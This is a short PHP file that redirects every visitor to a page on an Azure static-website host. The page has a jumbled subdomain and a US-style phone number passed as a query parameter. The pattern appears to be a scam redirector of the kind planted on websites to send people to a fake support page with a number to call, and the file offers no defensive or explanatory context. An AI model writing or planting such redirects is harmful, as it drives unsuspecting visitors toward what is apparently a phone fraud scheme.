<?php
// Define the destination URL
$destination_url = "https://default87gcode87xx87fe4.z24.web.core.windows.net/index.html?Aniph=1-803-201-2766";

// Send the Location header for redirection
header("Location: " . $destination_url);

// It's crucial to stop script execution after sending the header
// to prevent any further output or unintended actions.
exit(); 
?>